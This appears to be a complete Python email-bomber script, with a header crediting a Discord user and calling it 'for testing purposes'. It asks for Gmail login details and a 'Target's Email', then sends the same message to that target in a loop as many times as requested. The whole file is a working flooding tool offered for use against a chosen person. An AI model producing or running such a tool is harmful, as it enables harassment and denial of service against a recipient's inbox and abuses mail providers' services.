import os
import smtplib
import imghdr
import sys
from email.message import EmailMessage


    # Created by Tixsy#0666
    # If you have questions dm me on discord, Tixsy#0666
    # ----------------------------------------------------
    # This was created for testing purposes.
    # You will not use this for un - ethical use
    # any legal or other things that happen to you is on you.



i = 0

# This Grabs Users Info
sender_email = input(str("Enter Your Email:  "))
password = input(str("Please enter your password : "))
rec_email = input(str("Enter Target's Email:  "))
message = input(str("Message To The Target:   "))
subject = input(str("Subject:   "))
amount = int(input("Amount To Send:  "))


# This is compiling the email, Message, subject, to , from
msg = EmailMessage()
msg['Subject'] = subject
msg['From'] = sender_email
msg['To'] = rec_email
msg.set_content(message)

# This is the connection to gmail services, then logs in
with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
    smtp.login(sender_email, password)
    # This loops i and amount, sending emails.
    while i < amount:
        smtp.send_message(msg)
        i+=1
        # This counts the emails for the user.
        if i == 1:
            print (' %dst Email has been sent successfully ' %(i))
        elif i == 2:
            print (' %dnd Email has been sent successfully ' %(i))
        elif i == 3:
            print (' %drd Email has been sent successfully ' %(i))
        else:
            print (' %dth Email has been sent successfully ' %(i))
        sys.stdout.flush()
    smtp.quit()
    input('Sent all emails to' + rec_email)

